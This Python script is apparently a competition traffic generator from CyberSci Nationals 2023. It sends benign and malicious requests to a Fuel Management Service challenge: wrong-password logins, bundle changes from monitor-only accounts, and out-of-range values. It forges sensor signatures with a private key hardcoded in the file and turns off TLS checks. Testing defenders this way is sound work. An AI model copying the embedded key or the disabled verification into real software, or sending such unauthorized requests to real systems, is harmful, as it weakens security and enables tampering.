#!/usr/bin/env python3
#
# CyberSci Nationals 2023
#
# Dmitriy Beryoza (0xd13a)
#
# Attacker for Fuel Management Service

import requests
import traceback
import base64
import urllib3
import random
import string
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Signature.pkcs1_15 import PKCS115_SigScheme
from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REQUEST_TIMEOUT = 3

private_key = "-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQDFGtmtCW3HTi4f"\
    "Yq/rWsbc4pMP3+r0Amy3Egscv8y2TgW0MWVQ\nXYwB79GC03yeuFPPI5gJ4LxAp/cDCAYA0"\
    "OOZI+SVuyYGCD4FGY7H+s2V3WASjSdr\naBBSIXIIQ42UyOPwLhtjvjsT0pmLqoTlthwIPL"\
    "++rhTNDy/BeOkAj4mlbQIDAQAB\nAoGAAMZHNU7VXyDDGiK/nNTzvJj3cLIAXUVEnO3iI3Z"\
    "BJibMnTdneWAe87HGMa5/\nAwGnz1IJn++lOUlDPJWeSt15DF2ZxKh0dEZ1RajP+N+KkROm"\
    "TE5YkMe72ctDiYXZ\nxW26SDginTVyxCOy2axBYiWTU9U5HdAfx6J/a2dnYjqYv6ECQQDZp"\
    "LNFuNvir9R8\nhBwIZUY1HHUcE5JrRjFVf45j+0DMPpJnRyKcEkq6Dz+cJlzS0ey5HzCCd9"\
    "GSK9F0\nb9IRXdXNAkEA59eGyF/uHtN26josv4VvnIPU6T0kREKFTfOEOq2ixJNOEHH/L9M"\
    "1\nX651s7AB5rYjQDD9mR3tGimBk044z99uIQJARTAolYeYz02aPSM6Tijz0rqDODO4\nnk"\
    "WoNUfhmkMrbEKQBCkHBZqDCvcB/7/qTlLR8F/L6g3xH4iyg1Nw8nhkGQJBAKkO\nm4UPlsa"\
    "5spPX+ftqZNm/tAikAgcYbrZJ5VkYdoFbXOhXCBsqq1frEn8F0E0Y8ZmE\nX9hAXz3dmFP/"\
    "DSRfq6ECQQCVkME+QUX9LPSaVw+9tmuEVreT2+6DyCQpxRXNTvT4\n1fQZWt15sRUC30tlf"\
    "IL4tKBj1G0iW+tG/YrmXlI2Nkvm\n-----END RSA PRIVATE KEY-----"

MANAGEMENT_TECHNICIAN = 0
MONITOR = 1


class FuelManagementAttacker(Attacker):

    STATUS_API = "https://{}:{}/status"
    LOGIN_API = "https://{}:{}/login"
    SENSOR_API = "https://{}:{}/sensor"
    CHANGE_API = "https://{}:{}/change"

    filled = 0
    spent = 0
    users: dict[str, str] = {}
    usernames: list[str] = []

    def load_users(self):
        with open(Path(__file__).parent / "fms-users.txt", "r") as file:
            for line in file.readlines():
                username, pwd, _, monitor_only = line.strip().split(",")
                self.users[username] = (pwd, int(monitor_only))
        self.usernames = list(self.users.keys())

    def __init__(self, host, port):
        super().__init__(host, port)
        self.load_users()

    def get_cookies_from_response(self, response: requests.Response) -> dict:
        """Given a response, return all cookies as a dict."""
        cookies = response.cookies.get_dict()
        # If there was a redirect, the cookies we need may be in a previous
        # response
        for r in response.history:
            cookies.update(r.cookies.get_dict())  # Merge cookies

        return cookies

    def emulate_sensor(self):
        self.filled = random.randint(80, 280)
        self.spent = random.randint(round(self.filled * 0.1),
                                    round(self.filled * 0.4))

        payload = "bundles_used={}&bundles_candidates_for_removal={}".format(
            self.filled, self.spent)

        hash = SHA256.new(payload.encode())
        signer = PKCS115_SigScheme(RSA.import_key(private_key))
        signature = signer.sign(hash)
        enc_sig = base64.b64encode(signature)

        r = requests.post(url=self.SENSOR_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Signature": enc_sig, "Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code == 200:
            return True
        return False

    def success_login(self):
        if not self.emulate_sensor():
            return AttackResult.RESULT_FAILURE

        rand_user = random.choice(self.usernames)
        val = self.users[rand_user]

        payload = {"username": rand_user, "password": val[0]}
        print('fms - {}:{}'.format(rand_user, val[0]))

        r = requests.post(url=self.LOGIN_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code != 200:
            return AttackResult.RESULT_FAILURE

        cookies = self.get_cookies_from_response(r)

        r = requests.get(url=self.STATUS_API.format(self.host, self.port),
                         timeout=REQUEST_TIMEOUT,
                         cookies={"token": cookies.get("token")}, verify=False)

        if r.status_code == 200:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def bad_login(self):
        if not self.emulate_sensor():
            return AttackResult.RESULT_FAILURE

        rand_user = random.choice(self.usernames)

        pwd = ''.join(random.choices(string.ascii_letters + string.digits,
                                     k=20))
        payload = {"username": rand_user, "password": pwd}
        print('fms - {}:{}'.format(rand_user, pwd))

        r = requests.post(url=self.LOGIN_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code == 200:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def change_bundles(self, type, safe):
        if not self.emulate_sensor():
            return AttackResult.RESULT_FAILURE

        while True:
            rand_user = random.choice(self.usernames)
            val = self.users[rand_user]
            # Types are: 0: Management Technicians, 1: Monitor
            if val[1] == type:
                break

        payload = {"username": rand_user, "password": val[0]}
        print('fms - {}:{}'.format(rand_user, val[0]))

        r = requests.post(url=self.LOGIN_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code != 200:
            return AttackResult.RESULT_FAILURE

        cookies = self.get_cookies_from_response(r)

        r = requests.get(url=self.STATUS_API.format(self.host, self.port),
                         timeout=REQUEST_TIMEOUT,
                         cookies={"token": cookies.get("token")}, verify=False)

        cookies = self.get_cookies_from_response(r)

        if r.status_code != 200:
            return AttackResult.RESULT_FAILURE

        if safe:
            remove = random.randint(0, self.spent)

            # Make sure that with removals we insert so many so that we never
            # go below 80
            low = 0
            if self.filled-remove < 80:
                low = 80-(self.filled-remove)

            high = (280 - self.filled) + remove

            insert = random.randint(low, high)
        else:
            # generate random removal amount
            remove = random.randint(-20, self.spent+20)

            # if it turns out to be sane, create a bad insertion amount
            if (remove >= 0 and remove <= self.spent):
                # determine acceptable low and high values
                low = 0
                if (self.filled-remove) < 80:
                    low = 80-(self.filled-remove)

                high = (280 - self.filled) + remove

                while True:
                    # generate random value
                    insert = random.randint(-20, 220)
                    if insert < low or insert > high:
                        break
            else:
                insert = random.randint(0, 220)

        print("fms - filled {} spent {} insert {} remove {} after: filled: {} "
              "spent: {} ".format(self.filled, self.spent, insert, remove,
                                  self.filled+insert-remove,
                                  self.spent-remove))

        payload = {"bundles_to_insert": insert, "bundles_to_remove": remove}

        r = requests.post(url=self.CHANGE_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          cookies={"token": cookies.get("token")},
                          verify=False)

        if r.status_code == 200:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def no_priv_escalation(self):
        return self.change_bundles(MANAGEMENT_TECHNICIAN, True)

    def priv_escalation(self):
        return self.change_bundles(MONITOR, True)

    def good_management(self):
        return self.change_bundles(MANAGEMENT_TECHNICIAN, True)

    def bad_management(self):
        return self.change_bundles(MANAGEMENT_TECHNICIAN, False)

    def benign_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.success_login()
            elif id == 2:
                return self.no_priv_escalation()
            elif id == 3:
                return self.good_management()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))

    def malicious_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.bad_login()
            elif id == 2:
                return self.priv_escalation()
            elif id == 3:
                return self.bad_management()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))
